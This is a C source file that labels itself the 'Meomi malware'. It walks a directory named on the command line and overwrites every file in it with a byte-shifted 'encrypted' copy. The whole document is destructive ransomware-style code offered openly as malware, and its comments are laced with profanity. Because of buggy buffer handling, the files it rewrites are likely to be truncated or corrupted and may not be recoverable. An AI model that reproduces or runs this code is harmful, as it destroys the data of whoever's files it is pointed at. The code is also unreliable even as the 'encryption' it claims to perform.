/*
    ? created at October 21 2023, 11:37pm
    TODO craft a malware

        * Start
        * Browses Directory
        * Search for files
        * Encrypt searched files
        * End
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/stat.h>
#define SZE 5000

// * ENCypt The FUCking FIles
void __EncRyp_shIt(char __directory__[SZE], char __filename__[])
{
    int fd; char buffer[SZE], encrypt[SZE]; char path[SZE]; // * variables
    // * combines the diretory and the scanned file and store it in path VAR 
    sprintf(path, "%s/%s", __directory__, __filename__); 
    if ( (fd = open(path, O_RDONLY, S_IRUSR | S_IWUSR)) < 0 ) { 
        perror("FILE");
    }
    read(fd, buffer, sizeof(buffer)); // * reads file data and store it in buffer[] variable
    for(int i = 0; i < strlen(buffer); i++) // * encypt the file content
    {
        if (buffer[i] != '\0') {
            buffer[i] = buffer[i] + 100; // ! Reverse the arithmethic to decrypt the file
            encrypt[i] = buffer[i]; 
        }
    }
    close(fd); // * CLOSE the file
    if ( (fd = open(path, O_TRUNC | O_WRONLY)) < 0)  { // * Reopen the file and Delete file content
        perror("FILE");
    }
    write(fd, encrypt, strlen(encrypt)); // * replace file content withe the encrypted version
    close(fd); // * Fucking Close the file
}

// * FuncTION ro READ and LISt the files in the DIrectory
void __BrowSe_FucKK(char __directory[]) 
{
    DIR *dir;
    struct dirent *ent;
    if(NULL == (dir = opendir(__directory)) ) {
        perror("DIRR"); exit(-1);
    }
    while ( ent = readdir(dir) ) { // * Scans the file in the given directory
        // * The IF statement below checks if the ent->d_name is a directory or not
        if ( strcmp(ent -> d_name, "..") != 0 && strcmp(ent -> d_name, ".") != 0 ) {
            // * Now Call and Create a function that will Corrupt thye files in the list
            __EncRyp_shIt(__directory, ent -> d_name);
        }
    }
    closedir(dir);
}

void __FUcK_HElp(void) // * HELP function to use the Meomi Malware
{
    fprintf(stdout, 
    "\nThis is Meomi malware created by Mousymous Oct 21, 2023\n\n\tmeomi {path_name} \n\tencypts all the files in that path\n\n");
    exit(-1);
}

// * Open The argc[1] as the directory 
void main(int argv, char *argc[]) 
{
    // * ERROR Checking
    if (NULL == argc[1]) { __FUcK_HElp(); }
    else if( strcmp(argc[1], "-h") == 0) { __FUcK_HElp(); }
    else {__BrowSe_FucKK(argc[1]);} 
}   
